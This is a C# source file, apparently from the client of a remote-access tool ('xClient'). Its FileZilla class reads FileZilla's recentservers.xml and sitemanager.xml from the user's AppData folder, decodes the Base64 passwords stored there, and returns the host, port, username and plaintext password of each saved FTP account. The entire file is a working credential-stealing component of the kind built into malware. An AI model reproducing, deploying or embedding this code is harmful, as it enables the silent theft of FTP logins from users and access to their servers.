﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using xClient.Core.Data;

namespace xClient.Core.Recovery.FtpClients
{
    public class FileZilla
    {
        public static string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        public static string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            try
            {
                if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
                    return data;

                if (File.Exists(RecentServerPath))
                {
                    XmlTextReader xmlTReader = new XmlTextReader(RecentServerPath);
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);

                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        string szHost = string.Empty;
                        string szUsername = string.Empty;
                        string szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        data.Add(new RecoveredAccount
                        {
                            URL = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = "FileZilla"
                        });
                    }
                }

                if (File.Exists(SiteManagerPath))
                {
                    XmlTextReader xmlTReader = new XmlTextReader(SiteManagerPath);
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);

                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        string szHost = string.Empty;
                        string szUsername = string.Empty;
                        string szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        data.Add(new RecoveredAccount
                        {
                            URL = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = "FileZilla"
                        });
                    }
                }
                return data;
            }
            catch
            {
                return data;
            }
        }

        public static string Base64Decode(string szInput)
        {
            try
            {
                byte[] base64ByteArray = Convert.FromBase64String(szInput);
                return Encoding.UTF8.GetString(base64ByteArray);
            }
            catch
            {
                return szInput;
            }
        }
    }
}
